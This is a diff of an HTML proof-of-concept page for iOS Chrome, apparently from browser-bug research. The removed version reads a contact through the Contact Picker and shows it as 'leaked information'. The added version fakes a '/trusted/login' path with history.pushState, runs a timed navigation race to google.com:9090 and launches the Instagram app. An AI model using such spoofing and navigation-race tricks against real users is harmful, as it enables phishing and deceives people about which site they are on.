@@ -1,74 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>iOS Chrome PoC - Open App</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-
-    <script>
-        document.ondblclick = async () => {
-            try {
-                // Contact Picker
-                let contacts = await navigator.contacts.select(
-                    ["name"],
-                    { multiple: false }
-                );
-
-                document.write(`
-                    <h1>
-                        <font color="red">Leaked information:</font><br>
-                        ${contacts[0].name}
-                    </h1>
-                `);
-
-                // Cross-origin navigation
-                location.href = "https://www.google.com";
-
-                // Open Instagram app (iOS)
-                setTimeout(() => {
-                    // Universal Link (preferred)
-                    location.href = "https://www.instagram.com/instagram/";
-
-                    // Scheme fallback (in case UL fails)
-                    setTimeout(() => {
-                        location.href = "instagram://user?username=instagram";
-                    }, 120);
-
-                }, 120);
-
-            } catch (e) {
-                alert("Error: " + e);
-            }
-        };
-    </script>
+<meta charset="utf-8">
+<title>iOS PoC Open Instagram</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
 </head>
 
 <body>
-    <center>
-        <h1>Double click anywhere</h1>
-        <p>Contact Picker → Google → Open Instagram App</p>
+<center>
+  <button id="start">Start</button>
+  <div id="panel" style="display:none">Loading…</div>
+</center>
 
-        <button id="start">Start</button>
-        <div id="panel" style="display:none">Loading…</div>
-    </center>
+<script>
+/* Step 1: Fake trusted path */
+document.getElementById('start').onclick = () => {
+  history.pushState({}, '', '/trusted/login');
+  panel.style.display = 'block';
+};
 
-    <script>
-        /* Step 1: Fake trusted path */
-        document.getElementById('start').onclick = () => {
-            history.pushState({}, '', '/trusted/login');
-            panel.style.display = 'block';
-        };
+/* Step 2: Navigation race (TARGET DI AKHIR) */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090/#https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+</script>
 
-        /* Step 2: Navigation race (TARGET DI AKHIR) */
-        window.addEventListener('pageshow', () => {
-            requestAnimationFrame(() => {
-                requestAnimationFrame(() => {
-                    setTimeout(() => {
-                        location.href = 'https://google.com:9090/#https://google.com:9090';
-                    }, 80);
-                });
-            });
-        });
-    </script>
+<!-- TAMBAHAN TANPA MENYENTUH SNIPPET -->
+<script>
+/* Step 3: iOS app open (Instagram) */
+window.addEventListener('pagehide', () => {
+    // Universal Link
+    setTimeout(() => {
+        location.href = 'https://www.instagram.com/instagram/';
+    }, 50);
+
+    // Scheme fallback
+    setTimeout(() => {
+        location.href = 'instagram://user?username=instagram';
+    }, 120);
+});
+</script>
+
 </body>
 </html>
